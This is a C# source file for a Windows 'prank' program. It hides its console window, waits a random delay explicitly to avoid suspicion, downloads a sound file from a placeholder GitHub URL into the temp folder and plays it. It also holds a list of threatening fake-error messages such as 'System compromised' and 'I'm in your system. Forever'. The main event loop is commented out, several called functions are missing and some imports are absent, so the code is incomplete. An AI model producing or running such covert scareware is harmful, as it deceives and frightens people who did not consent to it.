using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Media;
using System.Net;


class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;  // Hide the window
    const int SW_SHOW = 5;  // Show the window

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

    [STAThread]
    static void Main()
    {
        // Hide Console Window to make it run silently
        ShowWindow(GetConsoleWindow(), SW_HIDE);

        // Start the prank (message box, etc.)
        StartPrank();

        // Run in background, no need to hold the console open
        System.Threading.Thread.Sleep(Timeout.Infinite);  // Run indefinitely
    }
    static private int startTimeMin = 20000;
    static private int startTimeMax = 120000;

    static private int minInterval = 60000;
    static private int maxInterval = 250000;

    static void StartPrank()
    {
        PlaySound();
        // Delay to avoid suspicion
        System.Threading.Thread.Sleep(Randomize(startTimeMin, startTimeMax));

        // Define probabilities (out of 100)
        int chanceShowMessage = 30;  // 30% chance
        int chancePlaySound = 20;    // 20% chance
        int chanceMoveMouse = 15;    // 15% chance
        int chanceOpenWebsite = 25;  // 25% chance
        int chanceShowImage = 10;    // 10% chance

        // Calculate cumulative probability ranges
        int[] chances = {
        chanceShowMessage,
        chanceShowMessage + chancePlaySound,
        chanceShowMessage + chancePlaySound + chanceMoveMouse,
        chanceShowMessage + chancePlaySound + chanceMoveMouse + chanceOpenWebsite,
        100 // The rest goes to ShowImage
        };


        // Show Message Box
        // Play Sound
        // Open Website
        // Show Image   
        // Change song spotify
        // Change volume
        // TTS

        /*
        while (true)
        {
            int roll = new Random().Next(1, 101); // Roll from 1 to 100

            if (roll <= chances[0])
                ShowMessage();
            else if (roll <= chances[1])
                PlaySound();
            else if (roll <= chances[2])
                MoveMouse();
            else if (roll <= chances[3])
                OpenWebsite();
            else
                ShowImage();

            // Random interval before next event
            System.Threading.Thread.Sleep(Randomize(minInterval, maxInterval));
        } */
    }

    static int Randomize(int min, int max)
    {
        return new Random().Next(min, max);
    }
    static void ShowMessage()
    {
        string[] messages =
        {
    "Why did you try to uninstall me?",
    "Your system is corrupted.",
    "Reinstall immediately or suffer.",
    "Your IP has been reported.",
    "This is only the beginning...",
    "You can't remove me that easily.",
    "Every time you try, I get stronger.",
    "Deleting me only makes things worse.",
    "I'm in your system. Forever.",
    "Nice try, but I'm still here.",
    "I wouldn’t do that if I were you.",
    "Error 404: Your freedom not found.",
    "What makes you think you're in control?",
    "Uninstalling? Haha, good one.",
    "That won’t work. Try harder.",
    "System Error: User is too naive.",
    "Look behind you.",
    "I'm watching. Always.",
    "You really thought that would work?",
    "You are not alone.",
    "I'm just getting started.",
    "This is my system now.",
    "Run while you still can.",
    "I control everything.",
    "Nice move, but not good enough.",
    "Deleting me was a mistake.",
    "I'll be back.",
    "I am embedded in your computer forever.",
    "Formatting won't help you.",
    "System compromised. Resistance is futile."
    };


        string message = messages[new Random().Next(messages.Length)];
        MessageBox(IntPtr.Zero, message, "Błąd", 0x20); // 0x30 = Warning Icon

    }

    static void PlaySound()
    {
        try
        {
            string url = "https://raw.githubusercontent.com/your-github-repo/Assets/Sounds/amb1.wav";
            string path = Path.Combine(Path.GetTempPath(), "creepy.wav");

            // Download if not exists
            if (!File.Exists(path))
            {
                using WebClient wc = new WebClient();
                wc.DownloadFile(url, path);
            }

            SoundPlayer player = new SoundPlayer(path);
            player.Play();
        }
        catch { }
    }

}
